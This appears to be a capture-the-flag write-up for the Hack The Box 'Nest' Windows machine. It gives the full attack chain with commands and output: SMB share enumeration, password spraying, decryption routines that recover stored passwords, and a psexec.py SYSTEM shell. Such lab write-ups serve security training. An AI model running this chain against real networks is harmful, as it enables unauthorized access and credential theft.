# Nest
>Author : Xyan1d3
>Date : 17th July 2021
>IP : 10.10.10.178
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sat Jul 17 13:49:50 2021 as: nmap -sC -sV -v -oN nmap/nest 10.10.10.178
Nmap scan report for nest.htb (10.10.10.178)
Host is up (0.074s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 5s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-17T08:20:20
|_  start_date: 2021-07-17T08:19:10
```

## Nmap all open tcp ports with scripts
```sql
# Nmap 7.91 scan initiated Sat Jul 17 20:29:24 2021 as: nmap -p445,4386 -A -oN nmap/nest-deep 10.10.10.178
Nmap scan report for nest.htb (10.10.10.178)
Host is up (0.079s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>

Host script results:
|_clock-skew: 5s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-17T15:02:19
|_  start_date: 2021-07-17T08:19:10

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   77.43 ms 10.10.14.1
2   80.70 ms nest.htb (10.10.10.178)
```

## SMB Enumeration
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest]
└──╼ # crackmapexec5.1.1 smb 10.10.10.178 -u null -p null --shares --spider Data
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\null:null 
SMB         10.10.10.178    445    HTB-NEST         [+] Enumerated shares
SMB         10.10.10.178    445    HTB-NEST         Share           Permissions     Remark
SMB         10.10.10.178    445    HTB-NEST         -----           -----------     ------
SMB         10.10.10.178    445    HTB-NEST         ADMIN$                          Remote Admin
SMB         10.10.10.178    445    HTB-NEST         C$                              Default share
SMB         10.10.10.178    445    HTB-NEST         Data            READ            
SMB         10.10.10.178    445    HTB-NEST         IPC$                            Remote IPC
SMB         10.10.10.178    445    HTB-NEST         Secure$                         
SMB         10.10.10.178    445    HTB-NEST         Users           READ
```

We try to enumerate the `users` shares by doing a simple `mget *`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null]
└──╼ # smbclient \\\\10.10.10.178\\Users
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 04:34:21 2020
  ..                                  D        0  Sun Jan 26 04:34:21 2020
  Administrator                       D        0  Fri Aug  9 20:38:23 2019
  C.Smith                             D        0  Sun Jan 26 12:51:44 2020
  L.Frost                             D        0  Thu Aug  8 22:33:01 2019
  R.Thompson                          D        0  Thu Aug  8 22:32:50 2019
  TempUser                            D        0  Thu Aug  8 04:25:56 2019

                10485247 blocks of size 4096. 6543684 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*
```
Here, We have a possible usernames list.
```txt
Administrator
C.Smith
L.Frost
R.Thompson
TempUser
```

We may now enumerate the `Data` share.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null]
└──╼ # smbclient //10.10.10.178/Data
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug  8 04:23:46 2019
  ..                                  D        0  Thu Aug  8 04:23:46 2019
  IT                                  D        0  Thu Aug  8 04:28:07 2019
  Production                          D        0  Tue Aug  6 03:23:38 2019
  Reports                             D        0  Tue Aug  6 03:23:44 2019
  Shared                              D        0  Thu Aug  8 00:37:51 2019

                10485247 blocks of size 4096. 6543684 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \IT\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Reports\*
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.4 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

We read those files and find out that there is an credential.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null/Shared]
└──╼ # ls
Maintenance  Templates
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null/Shared]
└──╼ # cat Maintenance/Maintenance\ Alerts.txt 
There is currently no scheduled maintenance work┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null/Shared]
└──╼ # cat Templates/
HR/        Marketing/ 
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/null/Shared]
└──╼ # cat Templates/HR/Welcome\ Email.txt 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

We do a password spray on all the users with the password found.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest]
└──╼ # crackmapexec5.1.1 smb 10.10.10.178 -u users.lst -p pass.lst --continue-on-success
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\L.Frost:welcome2019 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\R.Thompson:welcome2019 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\TempUser:welcome2019
```

We enumerate the `Tempuser` account and find out that it has an empty text document inside its users directory.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/tempuser]
└──╼ # smbclient -U 'TempUser' //10.10.10.178/Users
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
getting file \TempUser\New Text Document.txt of size 0 as TempUser/New Text Document.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/tempuser]
└──╼ # cat TempUser/New\ Text\ Document.txt
```

```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/tempuser]
└──╼ # smbclient -U 'TempUser' //10.10.10.178/Data
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \IT\Configs\Adobe\editing.xml of size 246 as IT/Configs/Adobe/editing.xml (0.8 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \IT\Configs\Adobe\Options.txt of size 0 as IT/Configs/Adobe/Options.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \IT\Configs\Adobe\projects.xml of size 258 as IT/Configs/Adobe/projects.xml (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \IT\Configs\Adobe\settings.xml of size 1274 as IT/Configs/Adobe/settings.xml (3.6 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \IT\Configs\Atlas\Temp.XML of size 1369 as IT/Configs/Atlas/Temp.XML (4.7 KiloBytes/sec) (average 1.8 KiloBytes/sec)
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as IT/Configs/Microsoft/Options.xml (5.6 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as IT/Configs/NotepadPlusPlus/config.xml (17.1 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as IT/Configs/NotepadPlusPlus/shortcuts.xml (6.7 KiloBytes/sec) (average 5.0 KiloBytes/sec)
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as IT/Configs/RU Scanner/RU_config.xml (0.9 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
```

We enumerate the `//10.10.10.178/Data/IT/Configs/NotepadPlusPlus/` and find out that we have some hardcoded paths to files.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/tempuser/IT/Configs/NotepadPlusPlus]
└──╼ # smbclient -U 'TempUser' //10.10.10.178/Data
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug  8 04:23:46 2019
  ..                                  D        0  Thu Aug  8 04:23:46 2019
  IT                                  D        0  Thu Aug  8 04:28:07 2019
  Production                          D        0  Tue Aug  6 03:23:38 2019
  Reports                             D        0  Tue Aug  6 03:23:44 2019
  Shared                              D        0  Thu Aug  8 00:37:51 2019

                10485247 blocks of size 4096. 6543684 blocks available
smb: \> cd IT\Configs\NotepadPlusPlus\
smb: \IT\Configs\NotepadPlusPlus\> ls
  .                                   D        0  Thu Aug  8 01:01:37 2019
  ..                                  D        0  Thu Aug  8 01:01:37 2019
  config.xml                          A     6451  Thu Aug  8 04:31:25 2019
  shortcuts.xml                       A     2108  Thu Aug  8 01:00:27 2019

                10485247 blocks of size 4096. 6543684 blocks available
```

We find out that the `user.txt` is owned by the `C.Smith` user.
![[Pasted image 20210717214018.png]]

We find out that we find out some encrypted credentials of `C.Smith`
```xml
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/tempuser/IT/Configs/RU Scanner]
└──╼ # cat RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```
![[Pasted image 20210717223046.png]]

We find out an `VB Project` in the directory `\\10.10.10.178\Secure$\IT\Carl` directory.
Which consists of function to decrypt the credentials. Now, We run those two functions to decrypt the credentials.
```vb.net
Imports System
Imports System.Text
Imports System.Security.Cryptography


Public Module Module1
	Public Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
	Public Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function
	Public Sub Main()
		Console.WriteLine(DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
	End Sub
End Module
```

![[Pasted image 20210717230029.png]]

|Username|Password|
|--|--|
|C.Smith|xRxRxPANCAK3SxRxRx|

The credentials infact work on the `C.Smith` account.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest]
└──╼ # crackmapexec smb 10.10.10.178 -u users.lst -p pass.lst --continue-on-success
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:xRxRxPANCAK3SxRxRx STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx
```

We could now enumerate the `Users\C.Smith` share and find out that we have the `user.txt` and a `HQK Reporting`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith]
└──╼ # smbclient -U 'C.Smith' //10.10.10.178/Users
Enter WORKGROUP\C.Smith's password: 
Try "help" to get a list of possible commands.
smb: \> cd C.Smith\
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 12:51:44 2020
  ..                                  D        0  Sun Jan 26 12:51:44 2020
  HQK Reporting                       D        0  Fri Aug  9 04:36:17 2019
  user.txt                            A       32  Fri Aug  9 04:35:24 2019

                10485247 blocks of size 4096. 6543300 blocks available
smb: \C.Smith\> prompt off
smb: \C.Smith\> recurse on
smb: \C.Smith\> mget *
getting file \C.Smith\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as HQK Reporting/Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK Reporting/HQK_Config_Backup.xml (0.4 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HQK Reporting/AD Integration Module/HqkLdap.exe (33.3 KiloBytes/sec) (average 10.7 KiloBytes/sec)
```

## Getting the user Flag
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith]
└──╼ # ls -l
total 8
drwxr-xr-x 3 root root 4096 Jul 17 23:07 'HQK Reporting'
-rw-r--r-- 1 root root   32 Jul 17 23:07  user.txt
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith]
└──╼ # cat user.txt 
cf71b25404be5d84fd827e05f426e987
```

We enumerate the `C.Smith` and find out that the `Debug Mode Password.txt` has an alternate data stream.
```python
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Fri Aug  9 04:36:17 2019
  ..                                  D        0  Fri Aug  9 04:36:17 2019
  AD Integration Module               D        0  Fri Aug  9 17:48:42 2019
  Debug Mode Password.txt             A        0  Fri Aug  9 04:38:17 2019
  HQK_Config_Backup.xml               A      249  Fri Aug  9 04:39:05 2019

                10485247 blocks of size 4096. 6543428 blocks available
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Fri Aug  9 04:36:12 AM 2019 IST
access_time:    Fri Aug  9 04:36:12 AM 2019 IST
write_time:     Fri Aug  9 04:38:17 AM 2019 IST
change_time:    Fri Aug  9 04:38:17 AM 2019 IST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt":Password
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

We get the debug mode credentials.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith]
└──╼ # cat Debug\ Mode\ Password.txt\:Password 
WBQ201953D8w
```

**The `Debug Mode Password` : `WBQ201953D8w`**

We could now use the telnet protocol as previously only allowed to list directories.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[/mnt/C.Smith/HQK Reporting]
└──╼ # telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```
We could now get into the `C:\Program Files\HQK\LDAP` using `setdir` and use `showquery` to read the `Ldap.conf` and find out some credentials.

```python
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: hqk
>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```
We need to decompile the `HQK Reporting/AD Integration Module/HQKLdap.exe` and find out that it is a `C#` binary which decodes the `Ldap.conf`.
![[Pasted image 20210717235848.png]]

We copy those functions that decode the password to an online `C#` compiler.
```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
					
public class Program
{
	private const string K = "667912";
	private const string I = "1L1SA61493DRV53Z";
	private const string SA = "1313Rf99";
	private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(initVector);
		byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
		byte[] array = Convert.FromBase64String(cipherText);
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
		checked
		{
			byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(bytes3, bytes);
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length + 1];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.ASCII.GetString(array2, 0, count);
		}
	}
	public static string DS(string EncryptedString)
	{
		if (string.IsNullOrEmpty(EncryptedString))
		{
			return string.Empty;
		}
		return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
	}
	public static void Main()
	{
		Console.WriteLine(DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
	}
}
```

**The `Administrator` Password : `XtH4nkS4Pl4y1nGX`**

# Root Escalation
We try those credentials on the box and find out that it is a jackpot.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith/HQK Reporting/AD Integration Module]
└──╼ # crackmapexec smb 10.10.10.178 -u Administrator -p XtH4nkS4Pl4y1nGX
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\Administrator:XtH4nkS4Pl4y1nGX (Pwn3d!)
```

We can now do a `psexec.py` to get a shell on the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/nest/smb/c.smith/HQK Reporting/AD Integration Module]
└──╼ # psexec.py Administrator@10.10.10.178
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file AtJTJYvf.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service yqqN on 10.10.10.178.....
[*] Starting service yqqN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
![[Pasted image 20210718000504.png]]

## Getting the Root Flag
```python
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 2C6F-6A14

 Directory of C:\Users\Administrator\Desktop

01/26/2020  08:20 AM    <DIR>          .
01/26/2020  08:20 AM    <DIR>          ..
08/05/2019  11:27 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  26,801,209,344 bytes free

C:\Users\Administrator\Desktop>type root.txt
6594c2eb084bc0f08a42f0b94b878c41
```